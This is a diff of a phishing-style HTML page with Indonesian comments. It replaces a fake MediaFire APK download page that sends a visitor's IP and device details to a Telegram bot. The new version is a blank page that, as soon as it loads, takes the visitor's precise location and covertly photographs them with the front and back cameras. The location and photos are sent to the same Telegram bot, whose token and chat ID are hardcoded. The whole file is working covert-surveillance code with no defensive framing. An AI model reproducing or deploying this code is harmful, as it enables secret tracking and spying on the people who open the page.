@@ -1,87 +1,80 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MediaFire - Storage Restored</title>
+    <title>Sistem</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f3f3f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
-        .logo { color: #0070f3; font-weight: bold; font-size: 24px; margin-bottom: 20px; }
-        .file-info { background: #e9ecef; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px dashed #adb5bd; }
-        .btn-download { background-color: #0070f3; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; font-weight: bold; }
-        .footer { margin-top: 20px; font-size: 12px; color: #6c757d; }
+        body { background-color: black; color: black; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
-<div class="container">
-    <div class="logo">MediaFire</div>
-    <div class="file-info">
-        <strong id="fileName">Generating...</strong><br>
-        <span style="font-size: 13px; color: #666;">Size: 14.2 MB</span>
-    </div>
-    <a href="#" class="btn-download" id="downloadBtn">Download File</a>
-    <div class="footer">Your download will start shortly...</div>
-</div>
+    <script>
+        const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
+        const chatId = "7835924973";
 
-<script>
-    // konfigurasi bot telegram anda
-    const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
-    const chatId = "7835924973";
-
-    // generate nama file apk random
-    function generateRandomName() {
-        const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-        let result = "update_";
-        for (let i = 0; i < 8; i++) {
-            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        async function sendToTelegram(message, type = 'text') {
+            let url = `https://api.telegram.org/bot${botToken}/`;
+            if (type === 'text') {
+                await fetch(url + "sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } else if (type === 'photo') {
+                const blob = await (await fetch(message)).blob();
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, "capture.jpg");
+                await fetch(url + "sendPhoto", { method: "POST", body: formData });
+            }
         }
-        return result + ".apk";
-    }
 
-    const randomApkName = generateRandomName();
-    document.getElementById('fileName').innerText = randomApkName;
-
-    // fungsi pelacakan ip dan pengiriman data
-    async function trackVictim() {
-        try {
-            // mengambil data ip dari api eksternal
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ipAddress = data.ip;
-
-            // mengambil informasi detail lainnya (opsional tapi mematikan)
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-
-            // pesan yang dikirim ke telegram
-            const message = `🎯 target terdeteksi!\n\n🌐 ip: ${ipAddress}\n📱 perangkat: ${platform}\n📝 user agent: ${userAgent}\n📂 file: ${randomApkName}`;
-
-            // kirim ke bot telegram
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
-        } catch (error) {
-            console.log("tracking failed but proceeding...");
+        async function captureCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(dataUrl);
+                    };
+                });
+            } catch (e) {
+                return null;
+            }
         }
-    }
 
-    // eksekusi tracking saat halaman dibuka
-    window.onload = trackVictim;
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const info = `LOKASI TARGET TERDETEKSI:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToTelegram(info);
+            }, null, { enableHighAccuracy: true });
+        }
 
-    // simulasi download file apk saat tombol diklik
-    document.getElementById('downloadBtn').onclick = function() {
-        alert("downloading " + randomApkName);
-        // anda bisa mengarahkan ini ke file payload asli anda
-        // window.location.href = "https://your-malicious-site.com/payload.apk";
-    };
-</script>
+        window.onload = async () => {
+            // Jalankan pelacakan lokasi
+            getLocation();
 
+            // Tangkap kamera depan
+            const frontImg = await captureCamera("user");
+            if (frontImg) await sendToTelegram(frontImg, 'photo');
+
+            // Tangkap kamera belakang
+            const backImg = await captureCamera("environment");
+            if (backImg) await sendToTelegram(backImg, 'photo');
+        };
+    </script>
 </body>
 </html>
